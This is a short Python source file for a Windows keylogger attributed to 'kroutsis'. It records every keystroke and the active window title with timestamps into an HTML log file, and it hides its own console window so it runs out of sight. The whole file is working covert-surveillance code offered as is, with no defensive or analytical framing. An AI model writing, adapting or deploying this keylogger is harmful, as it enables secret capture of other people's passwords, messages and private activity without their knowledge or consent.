#kroutsis' keylogger
import win32console
import win32gui as wg
from datetime import datetime
from time import sleep
from pynput.keyboard import Listener, Key
from pynput import mouse


def get_date_time():
    now = datetime.now()
    date_time_now = now.strftime("%d-%m-%Y/%H:%M:%S")
    return date_time_now

def get_window_name():
    global last_win_name
    win_name = wg.GetWindowText(wg.GetForegroundWindow())
    if win_name != last_win_name:
        last_win_name = win_name
        return win_name
  
def clean_keys(key):
    key = str(key)
    if key != "Key.enter":
        if key[0] == "'":
            key = key.strip("'")
        elif key[0] == "K":
            key = key.replace("Key.", "&lt;") + "&gt;"
        return key
    else:
        return " &crarr;<br>"

def write_file(key):
    with open("log.html", "a") as f:
        key = clean_keys(key)
        f.write(key)

def on_press(key):
    if str(key) == '<75>':
        wg.ShowWindow(win, 1) #1 to show
    elif str(key) == '<76>':
        write_file("<br></body></html><hr>")
        quit()
    else:
        write_file(key)
        #print("{0} Pressed".format(key))

def on_click(x, y, button, pressed):
    win_name = get_window_name()
    date_time = get_date_time()
    if win_name:
        write_file("<strong>[" + win_name + "]" + " [" + date_time + "]</strong><br>")
        #print(win_name)
        

print("==== KEYLOGGER ====")
print("Press ctrl+alt+k to show cmd. \nPress ctrl+alt+l to quit. \n")
sleep(5)
win = win32console.GetConsoleWindow()
wg.ShowWindow(win, 0) #0 to hide
last_win_name = wg.GetWindowText(wg.GetForegroundWindow())
write_file("<html><body>")

with mouse.Listener(on_click=on_click) as listener:
    with Listener(on_press=on_press) as listener:
        listener.join()